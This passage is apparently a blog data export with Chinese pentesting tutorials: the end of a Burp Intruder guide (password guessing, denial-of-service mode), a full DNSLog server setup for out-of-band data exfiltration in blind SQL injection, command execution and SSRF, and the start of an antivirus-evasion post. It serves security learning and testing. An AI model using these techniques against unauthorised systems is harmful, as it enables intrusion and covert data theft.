class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Add prefix - 添加一个文字前缀</span><br><span class=\"line\">Add suffix - 添加一个文字后缀</span><br><span class=\"line\">Match/replace - 将替换匹配特定正则表达式的有效载荷的任何部位，用一个文字字符串表示。</span><br><span class=\"line\">Substring - 提取的有效载荷的子部分中，从指定的偏移量（0-索引）和至所指定的长度开始。</span><br><span class=\"line\">Reverse substring - 对于子规则来说，最终的偏移量指定的有效载荷的末尾向后计数，并且长度从端部向后偏移计数。</span><br><span class=\"line\">Modify case - 这个修改了的有效载荷的情况下，如果适用的话。同样的选项作为的情况下修改有效载荷类型。</span><br><span class=\"line\">Encode - URL，HTML，Base64的，ASCII码或十六进制字符串构建各种平台：采用不同的计划，该编码的有效载荷。</span><br><span class=\"line\">Hash - hash</span><br><span class=\"line\">Add raw payload - 这之前或之后，在当前处理的值增加了原始负载值。它可以是有用的，例如，如果你需要提交相同的有效载荷在raw和哈希表。</span><br><span class=\"line\">Skip raw payload - 将检查是否当前处理的值匹配指定的正则表达式，如果是这样，跳过有效载荷和移动到下一个。这可能是有用的，例如，如果知道一个参数值必须有一个最小长度和要跳过的一个列表，比这更短的长度的任何值。</span><br><span class=\"line\">Invoke Burp extension - 调用一个Burp exxtension(扩展)来处理负载。扩展名必须已注册入侵者有效载荷处理器。您可以从已注册的当前加载的扩展可用的处理器列表中选择所需的处理器。</span><br></pre></td></tr></table></figure>\n\n<p>是规则的以下类型：</p>\n<h4 id=\"2-Payload-Encoding\"><a href=\"#2-Payload-Encoding\" class=\"headerlink\" title=\"2)Payload Encoding\"></a>2)Payload Encoding</h4><p>你可以配置哪些有效载荷中的字符应该是URL编码的HTTP请求中的安全传输。任何已配置的URL编码最后应用，任何有效载荷处理规则执行之后。 这是推荐使用此设置进行最终URL编码，而不是一个有效载荷处理规则，因为可以用来有效载荷的grep选项来检查响应为呼应有效载荷的最终URL编码应用之前。…</p>\n<h3 id=\"Optins\"><a href=\"#Optins\" class=\"headerlink\" title=\"Optins\"></a>Optins</h3><p>此选项卡包含了request headers，request engine，attack results ，grep match，grep_extrack，grep payloads和redirections。你可以发动攻击之前，在主要Intruder的UI上编辑这些选项，大部分设置也可以在攻击时对已在运行的窗口进行修改。</p>\n<h4 id=\"Request-Headers-1\"><a href=\"#Request-Headers-1\" class=\"headerlink\" title=\"Request Headers\"></a>Request Headers</h4><p>这些设置控制在攻击Intruder(入侵者)是否更新配置请求头。请注意，您可以完全控制请求头通过在Payload positions(有效载荷位置)标签的要求范围内。这些选项可以用来更新每个请求的报头的方式，通常是有帮助的。</p>\n<p>下列选项可用：</p>\n<p>Update Content-length header(更新Content-Length头) - 此选项使Intruder(入侵者)添加或更新的Content-Length头的每个请求，与该特定请求的HTTP体的长度正确的值。此功能通常用于该插入可变长度的有效载荷送入模板的HTTP请求的主体的攻击至关重要。如果未指定正确的值，则目标服务器可能会返回一个错误，可能不完全响应请求，或者可能无限期地等待在请求继续接收数据。</p>\n<p>Set Connection:close(设置连接：关闭) - 此选项使Intruder(入侵者)添加或更新连接头的值为“close(关闭)” 。在某些情况下（当服务器本身并不返回一个有效的Content-Length或Transfer-Encoding头） ，这个选项可以让攻击更快速地执行。</p>\n<h4 id=\"Request-Engine\"><a href=\"#Request-Engine\" class=\"headerlink\" title=\"Request Engine\"></a>Request Engine</h4><p>设置控制用于发出HTTP请求中的Intruder(入侵者)攻击的Engine(引擎)。下列选项可用：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Number of threads(执行进程数) - [专业版]该选项控制并发请求数的攻击。</span><br><span class=\"line\">Number of retries on network failure(网络故障的重试次数) - 如果出现连接错误或其他网络问题，Burp会放弃和移动之前重试的请求指定的次数。测试时间歇性网络故障是常见的，所以最好是在发生故障时重试该请求了好几次。</span><br><span class=\"line\">Pause before retry(重试前暂停) - 当重试失败的请求，Burp会等待指定的时间（以毫秒为单位） ，然后重试失败以下。如果服务器被宕机，繁忙，或间歇性的问题发生，最好是等待很短的时间，然后重试。</span><br><span class=\"line\">Throttle between requests(请求之间的节流) - Burp可以在每次请求之前等待一个指定的延迟（以毫秒为单位） 。此选项很有用，以避免超载应用程序，或者是更隐蔽。或者，您可以配置一个可变延迟（与给定的初始值和增量） 。这个选项可以是有用的测试应用程序执行的会话超时时间间隔。</span><br><span class=\"line\">Start time(开始时间) - 此选项允许您配置攻击立即启动，或在指定的延迟后，或开始处于暂停状态。如果攻击被配置，将在未来的某个时刻以供将来使用被执行，或保存这些替代品可能是有用的。</span><br></pre></td></tr></table></figure>\n\n<p>小心使用这些选项可让您微调攻击引擎，这取决于对应用程序性能的影响，并在自己的处理能力和带宽。如果您发现该攻击运行缓慢，但应用程序表现良好和你自己的CPU利用率很低，可以增加线程数，使你的攻击进行得更快。如果您发现连接错误发生，该应用程序正在放缓，或者说自己的电脑被锁定了，你应该减少线程数，也许增加网络故障和重试之间的间隔重试的次数。</p>\n<h4 id=\"Attack-Results\"><a href=\"#Attack-Results\" class=\"headerlink\" title=\"Attack Results\"></a>Attack Results</h4><p>这些设置控制哪些信息被捕获的攻击效果。下列选项可用：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Store requests/responses(存储请求/响应) - 这些选项确定攻击是否会保存单个请求和响应的内容。保存请求和响应占用磁盘空间，在你的临时目录中，但可以让您在攻击期间在众目睽睽这些，如果有必要重复单个请求，并将其发送到其他Burp工具。</span><br><span class=\"line\">Make unmodified baseline request(未修改的基本请求) - 如果选择此选项，那么除了配置的攻击请求，Burp会发出模板请求设置为基值，所有有效载荷的位置。此请求将在结果表显示为项目＃ 0 。使用此选项很有用，提供一个用来比较的攻击响应基地的响应。</span><br><span class=\"line\">Use denial-of-service mode(使用拒绝服务的模式) - 如果选择此选项，那么攻击会发出请求，如正常，但不会等待处理从服务器收到任何答复。只要发出的每个请求， TCP连接将被关闭。这个功能可以被用来执行拒绝服务的应用层对脆弱的应用程序的攻击，通过重复发送该启动高负荷任务的服务器上，同时避免通过举办开放套接字等待服务器响应锁定了本地资源的请求。</span><br><span class=\"line\">Store full payloads(保存完整的有效载荷) - 如果选择此选项，Burp将存储全部有效载荷值的结果。此选项会占用额外的内存，但如果你想在运行时执行某些操作，如修改payload grep setting(有效负载值设置)，或重新发出请求与修改请求模板可能需要。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Grep-Match\"><a href=\"#Grep-Match\" class=\"headerlink\" title=\"Grep-Match\"></a>Grep-Match</h4><p>设置可用于包含在响应中指定的表达式标志结果的项目。对于配置列表中的每个项目，Burp会添加一个包含一个复选框，指出项目是否被发现在每个响应的新成果列。然后，您可以到组排序此列（通过单击列标题）匹配的结果相加。</p>\n<p>使用此选项可以是非常强大的，帮助分析大套的成绩，并迅速找出有趣的项目。例如，在口令猜测攻击，扫描短语，如“password incorrect(密码不正确)”或“login successful(登录成功)”，可以找到成功登录;在测试SQL注入漏洞，扫描含有“ ODBC ” ， “error(错误)”等消息可以识别易受攻击的参数。</p>\n<p>除了表达式匹配的列表，下列选项可用：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Match(匹配类型) - 指定的表达式是否是简单的字符串或regular expressions(正则表达式)。</span><br><span class=\"line\">Case sensitive match(区分大小写的匹配) - 指定检查表达式是否应区分大小写。</span><br><span class=\"line\">Exclude HTTP headers(不包括HTTP头) - 指定的HTTP响应头是否应被排除在检查。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Grep-Extrack\"><a href=\"#Grep-Extrack\" class=\"headerlink\" title=\"Grep-Extrack\"></a>Grep-Extrack</h4><p>可以被用来Extrack(提取)从反应有用的信息进入攻击结果的表。对于配置列表中的每个项目，Burp会添加一个包含提取该项目的文本的新成果列。然后，您可以排序此列（通过单击列标题）命令所提取的数据。例如我要匹配</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711122144357.png\" alt=\"Image123\" title=\"image123.png\"></p>\n<p>information_schema这个表。则可以这样写，都是需要匹配唯一的那种，也可以使用正则，前提是你会写正则。在乌云社区有人提起过当时怎么匹配手机号，就可以从这里提取。</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711122149847.png\" alt=\"Image125\" title=\"image125.png\"></p>\n<h4 id=\"Grep-Payloads\"><a href=\"#Grep-Payloads\" class=\"headerlink\" title=\"Grep-Payloads\"></a>Grep-Payloads</h4><p>设置可用于含有所提交的有效载荷的反射标志的结果项。如果启用该选项，Burp会添加一个包含一个复选框，指示当前负载的值是否被发现在每个响应的新成果列。 （如果使用一个以上的有效载荷，单独的列将每个有效载荷集加。 ）</p>\n<p>此功能可以在检测跨站点脚本和其他应对注入漏洞，它可以出现在用户输入动态地插入到应用程序的响应是有用的。</p>\n<p>下列选项可用：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Case sensitive match(区分大小写的匹配) - 指定检查payload(负载)是否应区分大小写。</span><br><span class=\"line\">Exclude HTTP headers(不包括HTTP头) - 这指定的HTTP响应头是否应被排除在检查。</span><br><span class=\"line\">Match against pre-URL-encoded payloads(对预URL编码的有效载荷匹配) - 这是正常的配置Inturder(入侵者)请求中URL编码的有效载荷。然而，这些通常是由应用程序解码，回荡在他们的原始形式。您可以使用此选项，以用于有效载荷Burp检查反应在他们的预编码形式。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Redirections\"><a href=\"#Redirections\" class=\"headerlink\" title=\"Redirections\"></a>Redirections</h4><p>控制Burp在进行攻击时如何处理重定向。它往往是要遵循重定向来实现你的攻击目标。例如，在一个口令猜测攻击，每一次尝试的结果可能只能通过下面的重定向显示。模糊测试的时候，相关的反馈可能只出现在最初的重定向响应后返回的错误消息。</p>\n<p>下列选项可用： Follow redirections(跟随重定向) - 控制重定向都遵循的目标。下列选项可用：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1)Never(从来没有) - 入侵者不会遵循任何重定向。</span><br><span class=\"line\">2)On-site only(现场唯一的) - 入侵者只会跟随重定向到同一个网页“网站” ，即使用相同的主机，端口和协议的是在原始请求使用的URL 。</span><br><span class=\"line\">3)In-scope only(调查范围内的唯一) - Intruder只会跟随重定向到该套件范围的目标范围之内的URL 。</span><br><span class=\"line\">4)Always(总是) - Intruder将遵循重定向到任何任何URL 。您应使用此选项时应谨慎 - 偶尔， Web应用程序在中继重定向到第三方的请求参数，并按照重定向你可能会不小心攻击。</span><br></pre></td></tr></table></figure>\n\n<p>Process cookies in redirections(过程中的Cookie重定向) - 如果选择此选项，然后在重定向响应设置任何cookies将被当重定向目标之后重新提交。例如，如果你正在尝试暴力破解登录的挑战就可能是必要的，它总是返回一个重定向到一个页面显示登录的结果，和一个新的会话响应每个登录尝试创建。</p>\n<p>Burp会跟进到10链重定向，如果必要的。在结果表中的列将显示重定向是否其次为每个单独的结果，以及完整的请求和响应中的重定向链存储与每个结果的项目。重定向的类型Burp会处理（ 3xx的状态码，刷新头，等）配置在一套全重定向选项。</p>\n<p>注意重定向： 在某些情况下，可能需要下面的重定向时只使用一个单线程的攻击。出现这种情况时，应用程序存储会话中的初始请求的结果，并提供重定向响应时检索此。</p>\n<p>自动下重定向有时可能会造成问题 - 例如，如果应用程序响应一个重定向到注销页面的一些恶意的请求，那么下面的重定向可能会导致您的会话被终止时，它原本不会这么做。</p>\n<h3 id=\"Attacks\"><a href=\"#Attacks\" class=\"headerlink\" title=\"Attacks\"></a>Attacks</h3><p>当你配置完你的攻击设置时，你需要launch the attacks(发起攻击)，analyze the results(分析结果)，有时修改攻击配置，与您的测试工作流程链接，或进行其他操作。</p>\n<h4 id=\"Launching-an-Attack\"><a href=\"#Launching-an-Attack\" class=\"headerlink\" title=\"Launching an Attack\"></a>Launching an Attack</h4><p>攻击可以通过两种方式启动：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1)您可以配置Target(目标)，Positions(位置)，Payloads(有效载荷)和Options(选项卡)的攻击设置，然后选择从Intruder(入侵者)菜单“Start attack(开始攻击)”。 </span><br><span class=\"line\">2)您可以通过从Intruder menu(入侵者菜单)中选择“previously saved attack(打开保存的攻击)”打开以前保存的攻击。 </span><br></pre></td></tr></table></figure>\n\n<p>在单独的窗口中每次攻击会打开。该窗口显示攻击为它们生成的结果，使您能够修改攻击配置实时，并与您的测试工作流程链接，或进行其他操作。</p>\n<h4 id=\"Result-Tab\"><a href=\"#Result-Tab\" class=\"headerlink\" title=\"Result Tab\"></a>Result Tab</h4><p>在结果选项卡包含在攻击发出的每个请求的全部细节。你可以过滤并标注此信息来帮助分析它，并使用它来驱动您的测试工作流程。</p>\n<h4 id=\"1-Results-Table\"><a href=\"#1-Results-Table\" class=\"headerlink\" title=\"1)Results Table\"></a>1)Results Table</h4><p>Results Table显示已在attack中所有的请求和响应的详细信息。根据不同的攻击配置，表可能包含以下几列，其中一些是默认隐藏的，可以使用Columns菜单 中取消隐藏：</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711122190859.png\" alt=\"Image127\" title=\"image127.png\"></p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711122295512.png\" alt=\"Image129\" title=\"image129.png\"></p>\n<p>request 请求数 Position 有效载荷位置编号 Payload 有效载荷 Status http状态 Error 请求错误 Timeout 超时 Length 字节数 Comment 注释</p>\n<h4 id=\"2-Display-Filter\"><a href=\"#2-Display-Filter\" class=\"headerlink\" title=\"2)Display Filter\"></a>2)Display Filter</h4><p>结果选项卡，可以用来隐藏某些内容从视图中，以使其更易于分析和对你感兴趣的工作内容显示过滤在结果表中。点击过滤器栏打开要编辑的过滤器选项。该过滤器可以基于以下属性进行配置：</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711122263054.png\" alt=\"Image131\" title=\"image131.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Search term(检索词) - [专业版]您可以筛选反应是否不包含指定的搜索词。您可以设定搜索词是否是一个文字字符串或正则表达式，以及是否区分大小写。如果您选择了“negative search(消极搜索)”选项，然后不匹配的搜索词唯一的项目将被显示。</span><br><span class=\"line\">Status code(状态代码) - 您可以配置是否要显示或隐藏各种HTTP状态码响应。</span><br><span class=\"line\">Annotation(注释) - 您可以设定是否显示使用用户提供的评论或只重点项目。在结果表中显示的内容实际上是一个视图到基础数据库，并显示过滤器控制什么是包含在该视图。如果设置一个过滤器，隐藏一些项目，这些都没有被删除，只是隐藏起来，如果你取消设置相关的过滤器将再次出现。这意味着您可以使用筛选器来帮助您系统地研究一个大的结果集（例如，从模糊测试包含许多参数的要求）来理解各种不同的有趣的响应出现。</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Attack-configuration-Tabs\"><a href=\"#Attack-configuration-Tabs\" class=\"headerlink\" title=\"Attack configuration Tabs\"></a>Attack configuration Tabs</h3><p>在结果选项卡中，攻击窗口包含每个从它目前的攻击是基于主界面的配置选项卡中的克隆。这使您能够查看和修改攻击配置，同时进攻正在进行中。有关进一步详情，请参阅各配置选项卡的帮助：目标职位有效载荷选项当修改一个跑动进攻的配置，以下几点值得关注：攻击结构的某些部分是基本的攻击（如攻击类型和有效载荷类型）的结构，并且攻击已经开始之后不能改变。改变配置的某些部分攻击正在运行时，可能会有意想不到的效果。</p>\n<p>例如，如果您使用的是数量的有效载荷和编辑字段中，然后更改才会生效，因为每个键被按下;如果你最初从删除数字字段中，那么攻击可能会突然完成，因为要字段现在包含一个较小的数字。我们强烈建议您暂停修改它们的配置运行前的攻击。</p>\n<h3 id=\"Result-Menus\"><a href=\"#Result-Menus\" class=\"headerlink\" title=\"Result Menus\"></a>Result Menus</h3><p>结果视图包含几个菜单命令与控制的攻击，并进行其他操作。这些将在下面说明。</p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711122362902.png\" alt=\"Image133\" title=\"image133.png\"></p>\n<p><img src=\"https://wooyun.js.org/images_result/images/2014101711122330940.png\" alt=\"Image135\" title=\"image135.png\"></p>\n<h4 id=\"1-Attack-Menu-攻击菜单\"><a href=\"#1-Attack-Menu-攻击菜单\" class=\"headerlink\" title=\"1)Attack Menu(攻击菜单)\"></a>1)Attack Menu(攻击菜单)</h4><p>包含的命令pause(暂停)，resume(继续)或repeat(重复)攻击。</p>\n<h4 id=\"2）Save-Menu-保存菜单\"><a href=\"#2）Save-Menu-保存菜单\" class=\"headerlink\" title=\"2）Save Menu(保存菜单)\"></a>2）Save Menu(保存菜单)</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">attack - 这是用来保存当前攻击的副本，包括结果。保存的文件可以使用从主Burp的UI Intruder菜单中的“打开保存的攻击”选项来重新加载。</span><br><span class=\"line\">Results table - 这是用于对结果表保存为一个文本文件。你可以选择保存的所有行，或仅选定的行。您也可以选择要包括的列，列分隔符。此功能是有用的导出结果到电子表格中，以便进一步分析，或用于保存单个列（如使用提取的grep函数挖掘数据），以用作用于随后的攻击或其它工具的输入文件。</span><br><span class=\"line\">Server responses - 这是用于保存收到的所有请求的全部应答。这些既可以被保存在单独的文件中（顺序编号）或串行级联的序列转换成一个单一的文件。</span><br><span class=\"line\">Attack configuration - 这是用来保存当前正在执行攻击的配置（而不是结果）。您可以重新使用从主Burp的UI Intruder菜单中的“加载配置攻击”选项，攻击配置。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"3-Columns-Menu-列菜单\"><a href=\"#3-Columns-Menu-列菜单\" class=\"headerlink\" title=\"3)Columns Menu(列菜单)\"></a>3)Columns Menu(列菜单)</h4><p>这使您可以选择哪些可用的列是可见的攻击结果表。<br></style></p>"},{"title":"平台搭建-DNSLog","cover":"https://img1.baidu.com/it/u=2960356299,1327658431&fm=253&fmt=auto&app=120&f=JPEG?w=1422&h=800","swiper_index":10,"top_group_index":10,"background":"#fff","date":"2025-03-20T02:40:11.000Z","updated":"2025-03-20T15:17:39.989Z","keywords":null,"description":null,"top":null,"top_img":null,"comments":1,"toc":null,"toc_number":null,"toc_style_simple":null,"copyright":null,"copyright_author":"转载","copyright_author_href":null,"copyright_url":null,"copyright_info":null,"mathjax":null,"katex":null,"aplayer":null,"highlight_shrink":null,"aside":null,"ai":null,"_content":"# DNS Log平台搭建\n\n## DNS Log简介\n\n在某些情况下，无法利用漏洞获得回显。但是，如果目标可以发送DNS请求，则可以通过DNS Log方式将想获得的数据外带出来（oob）。\n\nDNS log常用于以下情况：\n\n- SQL盲注\n- 无回显的命令执行\n- 无回显的SSRF\n\n## 搭建DNS Log平台\n\n### 前期准备\n\n一台VPS：\n\n```\n1.1.1.1\n```\n\n两个域名：\n\n```\na.com\nb.com\n```\n\n在`b.com`中添加两个A记录：\n\n![image-20220509150850946](./images/202205091508042.png)\n\n修改`a.com`的NS记录为：\n\n![image-20220509151352683](./images/202205091513716.png)\n\n### 项目部署\n\n参考开源项目DNSlog-GO：\n\n- https://github.com/lanyi1998/DNSlog-GO\n\nVPS防火墙放行53端口、80端口，修改配置文件`config.ini`：\n\n```\n[HTTP]\nPort = 80\nToken = <API TOKEN 1 HERE>,<API TOKEN 2 HERE>\nConsoleDisable = false\n\n[DNS]\nDomain = a.com\n```\n\n运行`main`文件：\n\n```\n./main\n```\n\n### 使用测试\n\n![image-20220509152556402](./images/202205091525438.png)\n</style>\n","source":"_posts/平台搭建-DNSLog.md","raw":"---\ntitle: 平台搭建-DNSLog\ncover: https://img1.baidu.com/it/u=2960356299,1327658431&fm=253&fmt=auto&app=120&f=JPEG?w=1422&h=800\nswiper_index: 10\ntop_group_index: 10\nbackground: '#fff'\ndate: 2025-03-20 10:40:11\nupdated:\ntags: 攻防知识\ncategories:\nkeywords:\ndescription:\ntop:\ntop_img:\ncomments:\ntoc:\ntoc_number:\ntoc_style_simple:\ncopyright:\ncopyright_author: 转载\ncopyright_author_href:\ncopyright_url:\ncopyright_info:\nmathjax:\nkatex:\naplayer:\nhighlight_shrink:\naside:\nai:\n---\n# DNS Log平台搭建\n\n## DNS Log简介\n\n在某些情况下，无法利用漏洞获得回显。但是，如果目标可以发送DNS请求，则可以通过DNS Log方式将想获得的数据外带出来（oob）。\n\nDNS log常用于以下情况：\n\n- SQL盲注\n- 无回显的命令执行\n- 无回显的SSRF\n\n## 搭建DNS Log平台\n\n### 前期准备\n\n一台VPS：\n\n```\n1.1.1.1\n```\n\n两个域名：\n\n```\na.com\nb.com\n```\n\n在`b.com`中添加两个A记录：\n\n![image-20220509150850946](./images/202205091508042.png)\n\n修改`a.com`的NS记录为：\n\n![image-20220509151352683](./images/202205091513716.png)\n\n### 项目部署\n\n参考开源项目DNSlog-GO：\n\n- https://github.com/lanyi1998/DNSlog-GO\n\nVPS防火墙放行53端口、80端口，修改配置文件`config.ini`：\n\n```\n[HTTP]\nPort = 80\nToken = <API TOKEN 1 HERE>,<API TOKEN 2 HERE>\nConsoleDisable = false\n\n[DNS]\nDomain = a.com\n```\n\n运行`main`文件：\n\n```\n./main\n```\n\n### 使用测试\n\n![image-20220509152556402](./images/202205091525438.png)\n</style>\n","slug":"平台搭建-DNSLog","published":1,"layout":"post","photos":[],"_id":"cm8iuwsr9000brcn13vkog1l0","content":"<h1 id=\"DNS-Log平台搭建\"><a href=\"#DNS-Log平台搭建\" class=\"headerlink\" title=\"DNS Log平台搭建\"></a>DNS Log平台搭建</h1><h2 id=\"DNS-Log简介\"><a href=\"#DNS-Log简介\" class=\"headerlink\" title=\"DNS Log简介\"></a>DNS Log简介</h2><p>在某些情况下，无法利用漏洞获得回显。但是，如果目标可以发送DNS请求，则可以通过DNS Log方式将想获得的数据外带出来（oob）。</p>\n<p>DNS log常用于以下情况：</p>\n<ul>\n<li>SQL盲注</li>\n<li>无回显的命令执行</li>\n<li>无回显的SSRF</li>\n</ul>\n<h2 id=\"搭建DNS-Log平台\"><a href=\"#搭建DNS-Log平台\" class=\"headerlink\" title=\"搭建DNS Log平台\"></a>搭建DNS Log平台</h2><h3 id=\"前期准备\"><a href=\"#前期准备\" class=\"headerlink\" title=\"前期准备\"></a>前期准备</h3><p>一台VPS：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.1.1.1</span><br></pre></td></tr></table></figure>\n\n<p>两个域名：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a.com</span><br><span class=\"line\">b.com</span><br></pre></td></tr></table></figure>\n\n<p>在<code>b.com</code>中添加两个A记录：</p>\n<p><img src=\"/./images/202205091508042.png\" alt=\"image-20220509150850946\"></p>\n<p>修改<code>a.com</code>的NS记录为：</p>\n<p><img src=\"/./images/202205091513716.png\" alt=\"image-20220509151352683\"></p>\n<h3 id=\"项目部署\"><a href=\"#项目部署\" class=\"headerlink\" title=\"项目部署\"></a>项目部署</h3><p>参考开源项目DNSlog-GO：</p>\n<ul>\n<li><a href=\"https://github.com/lanyi1998/DNSlog-GO\">https://github.com/lanyi1998/DNSlog-GO</a></li>\n</ul>\n<p>VPS防火墙放行53端口、80端口，修改配置文件<code>config.ini</code>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[HTTP]</span><br><span class=\"line\">Port = 80</span><br><span class=\"line\">Token = &lt;API TOKEN 1 HERE&gt;,&lt;API TOKEN 2 HERE&gt;</span><br><span class=\"line\">ConsoleDisable = false</span><br><span class=\"line\"></span><br><span class=\"line\">[DNS]</span><br><span class=\"line\">Domain = a.com</span><br></pre></td></tr></table></figure>\n\n<p>运行<code>main</code>文件：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./main</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"使用测试\"><a href=\"#使用测试\" class=\"headerlink\" title=\"使用测试\"></a>使用测试</h3><p><img src=\"/./images/202205091525438.png\" alt=\"image-20220509152556402\"><br></style></p>\n","cover_type":"img","excerpt":"","more":"<h1 id=\"DNS-Log平台搭建\"><a href=\"#DNS-Log平台搭建\" class=\"headerlink\" title=\"DNS Log平台搭建\"></a>DNS Log平台搭建</h1><h2 id=\"DNS-Log简介\"><a href=\"#DNS-Log简介\" class=\"headerlink\" title=\"DNS Log简介\"></a>DNS Log简介</h2><p>在某些情况下，无法利用漏洞获得回显。但是，如果目标可以发送DNS请求，则可以通过DNS Log方式将想获得的数据外带出来（oob）。</p>\n<p>DNS log常用于以下情况：</p>\n<ul>\n<li>SQL盲注</li>\n<li>无回显的命令执行</li>\n<li>无回显的SSRF</li>\n</ul>\n<h2 id=\"搭建DNS-Log平台\"><a href=\"#搭建DNS-Log平台\" class=\"headerlink\" title=\"搭建DNS Log平台\"></a>搭建DNS Log平台</h2><h3 id=\"前期准备\"><a href=\"#前期准备\" class=\"headerlink\" title=\"前期准备\"></a>前期准备</h3><p>一台VPS：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.1.1.1</span><br></pre></td></tr></table></figure>\n\n<p>两个域名：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a.com</span><br><span class=\"line\">b.com</span><br></pre></td></tr></table></figure>\n\n<p>在<code>b.com</code>中添加两个A记录：</p>\n<p><img src=\"/./images/202205091508042.png\" alt=\"image-20220509150850946\"></p>\n<p>修改<code>a.com</code>的NS记录为：</p>\n<p><img src=\"/./images/202205091513716.png\" alt=\"image-20220509151352683\"></p>\n<h3 id=\"项目部署\"><a href=\"#项目部署\" class=\"headerlink\" title=\"项目部署\"></a>项目部署</h3><p>参考开源项目DNSlog-GO：</p>\n<ul>\n<li><a href=\"https://github.com/lanyi1998/DNSlog-GO\">https://github.com/lanyi1998/DNSlog-GO</a></li>\n</ul>\n<p>VPS防火墙放行53端口、80端口，修改配置文件<code>config.ini</code>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[HTTP]</span><br><span class=\"line\">Port = 80</span><br><span class=\"line\">Token = &lt;API TOKEN 1 HERE&gt;,&lt;API TOKEN 2 HERE&gt;</span><br><span class=\"line\">ConsoleDisable = false</span><br><span class=\"line\"></span><br><span class=\"line\">[DNS]</span><br><span class=\"line\">Domain = a.com</span><br></pre></td></tr></table></figure>\n\n<p>运行<code>main</code>文件：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./main</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"使用测试\"><a href=\"#使用测试\" class=\"headerlink\" title=\"使用测试\"></a>使用测试</h3><p><img src=\"/./images/202205091525438.png\" alt=\"image-20220509152556402\"><br></style></p>\n"},{"title":"内网渗透-免杀","cover":"https://img1.baidu.com/it/u=877727430,37580436&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=667","swiper_index":10,"top_group_index":10,"background":"#fff","date":"2025-03-20T02:41:30.000Z","updated":"2025-03-20T15:17:54.131Z","keywords":null,"description":null,"top":null,"top_img":null,"comments":1,"toc":null,"toc_number":null,"toc_style_simple":null,"copyright":null,"copyright_author":"转载","copyright_author_href":null,"copyright_url":null,"copyright_info":null,"mathjax":null,"katex":null,"aplayer":null,"highlight_shrink":null,"aside":null,"ai":null,"_content":"# 内网渗透-免杀\n\n## 杀软原理\n\n可执行文件存在的两种状态及检测方式：\n\n- 未执行时在硬盘上的状态（静态检测）\n- 执行后加载进内存的状态（动态监测）\n\n杀软的基本等级：\n\n- 无害：无任何可疑行为，无任何特征命中病毒特征\n- 可疑：存在可疑行为，例如操作注册表、打开Powershell、修改用户、操作敏感文件等\n- 有害：特征命中病毒特征\n\n### 